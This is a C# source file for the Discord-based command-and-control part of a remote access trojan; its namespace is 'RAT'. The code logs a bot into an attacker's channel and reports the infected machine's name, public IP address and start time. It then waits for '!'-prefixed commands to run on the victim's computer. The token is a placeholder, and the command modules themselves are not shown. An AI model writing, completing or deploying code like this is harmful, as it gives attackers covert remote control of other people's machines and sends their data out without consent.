using Discord;
using Discord.Commands;
using Discord.WebSocket;
using Microsoft.Extensions.DependencyInjection;
using System;
using System.Net;
using System.Reflection;
using System.Threading.Tasks;

namespace RAT
{
    internal class Discord
    {
        public bool IsRunning { get; private set; }

        private DiscordSocketClient _client;
        private CommandService _commands;
        private IServiceProvider _services;

        public ulong ChannelId { get; set; } // ChannelId property

        private string _computerName;
        private string _location;
        private string _ipAddress;
        private DateTime _startTime;

        public Discord(ulong channelId)
        {
            ChannelId = channelId;
            _computerName = Environment.MachineName;
            _startTime = DateTime.Now;

            RunBotAsync().GetAwaiter().GetResult();
        }

        public async Task RunBotAsync()
        {
            IsRunning = true;

            var config = new DiscordSocketConfig
            {
                GatewayIntents = GatewayIntents.Guilds |
                            GatewayIntents.GuildMessages |
                            GatewayIntents.DirectMessages |
                            GatewayIntents.MessageContent
            };

            _client = new DiscordSocketClient(config);
            _commands = new CommandService();
            _services = new ServiceCollection().BuildServiceProvider();

            _client.Log += Log;

            await RegisterCommandsAsync();

            await _client.LoginAsync(TokenType.Bot, "Your-bot-token-here");  //Bot Token
            await _client.StartAsync();

            _client.Ready += async () =>
            {
                _client.SetGameAsync("Connected", null, ActivityType.Listening);
                _client.SetGameAsync("Commands", null, ActivityType.Listening);

                _ipAddress = await GetIpAddress();

                await SendStartupMessage();
            };

            _client.MessageReceived += HandleCommandAsync;

            await Task.Delay(-1);
            IsRunning = false;
        }

        private Task Log(LogMessage arg)
        {
            return Task.CompletedTask;
        }

        public async Task RegisterCommandsAsync()
        {
            await _commands.AddModuleAsync<ChatCommand>(_services);

            await _commands.AddModulesAsync(Assembly.GetEntryAssembly(), _services);
        }

        private async Task HandleCommandAsync(SocketMessage arg)
        {
            var message = arg as SocketUserMessage;
            var context = new SocketCommandContext(_client, message);

            if (message.Author.IsBot)
                return;

            int argPos = 0;
            if (message.HasStringPrefix("!", ref argPos))
            {
                await context.Channel.SendMessageAsync($"Command Received: {message.Content}");
                try
                {
                    var result = await _commands.ExecuteAsync(context, argPos, _services);
                    if (!result.IsSuccess)
                    {
                        await context.Channel.SendMessageAsync($"Command Execution Failed: {result.ErrorReason}");
                    }
                }
                catch (Exception ex)
                {
                    await context.Channel.SendMessageAsync($"Exception Occurred: {ex.Message}");
                }
            }
        }

        private async Task SendStartupMessage()
        {
            var channel = _client.GetChannel(ChannelId) as IMessageChannel;

            string message = $"Bot started on machine: {_computerName}" +
                $"\nIP Address: {_ipAddress}" +
                $"\nStart Time: {_startTime}";

            await channel.SendMessageAsync(message);
        }

        private async Task<string> GetIpAddress()
        {
            string ipAddress = string.Empty;
            try
            {
                ipAddress = await new WebClient().DownloadStringTaskAsync("https://api.ipify.org");
            }
            catch (Exception ex)
            {
                // Handle the exception if necessary
            }

            return ipAddress;
        }
    }
}
